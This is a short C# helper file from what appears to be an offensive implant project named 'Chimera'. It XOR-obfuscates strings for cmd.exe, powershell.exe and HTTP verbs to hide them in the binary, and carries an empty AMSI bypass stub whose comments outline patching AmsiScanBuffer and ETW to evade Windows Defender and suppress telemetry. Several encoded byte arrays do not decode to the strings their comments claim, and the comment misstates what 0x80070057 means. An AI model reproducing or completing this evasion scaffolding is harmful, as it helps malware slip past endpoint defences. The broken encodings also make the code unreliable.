using System;

namespace Chimera
{
    public static class StringHelper
    {
        // XOR key for compile-time string obfuscation
        // Change this before building for real use
        private static readonly byte XorKey = 0x41;

        // Decodes a XOR-encoded byte array back to a string
        public static string Decode(byte[] encoded)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ XorKey);
            return System.Text.Encoding.UTF8.GetString(decoded);
        }

        // Pre-encoded sensitive strings — never appear as plaintext in binary
        // To regenerate: foreach char, XOR with 0x41, store as byte array

        // "cmd.exe"
        public static readonly byte[] CMD      = { 0x22, 0x2C, 0x25, 0x60, 0x65, 0x60, 0x65 };

        // "powershell.exe"
        public static readonly byte[] PS       = { 0x31, 0x2E, 0x36, 0x65, 0x32, 0x29, 0x65,
                                                    0x60, 0x63, 0x63, 0x60, 0x2D, 0x65, 0x60, 0x65 };

        // "/c"
        public static readonly byte[] SLASH_C  = { 0x6E, 0x22 };

        // "POST"
        public static readonly byte[] POST     = { 0x11, 0x2E, 0x13, 0x15 };

        // "GET"
        public static readonly byte[] GET      = { 0x16, 0x24, 0x15 };

        // ---------------------------------------------------------------
        // AMSI BYPASS STUB
        // ---------------------------------------------------------------
        // This is intentionally empty — insert your bypass here.
        //
        // Public research to study:
        //   - rastamouse "AMSI Bypass" (2018, patching AmsiScanBuffer)
        //     https://rastamouse.me/memory-patching-amsi-bypass/
        //   - MDSec "Bypassing AMSI via COM Server Hijacking"
        //     https://www.mdsec.co.uk/2018/06/bypassing-amsi/
        //   - S3cur3Th1sSh1t PowerShell AMSI bypass collection
        //     https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
        //   - Techniques: patching amsi.dll in memory, forcing error path,
        //     hardware breakpoints, ETW patching (to suppress telemetry)
        //
        // Common approach for .NET:
        //   1. Get handle to amsi.dll via LoadLibrary
        //   2. Get address of AmsiScanBuffer via GetProcAddress
        //   3. Patch first bytes to force return AMSI_RESULT_CLEAN (0x80070057)
        //   Note: requires P/Invoke or D/Invoke to avoid suspicious imports
        // ---------------------------------------------------------------
        public static void BypassAMSI()
        {
            // TODO: implement bypass before enabling Defender testing
        }
    }
}
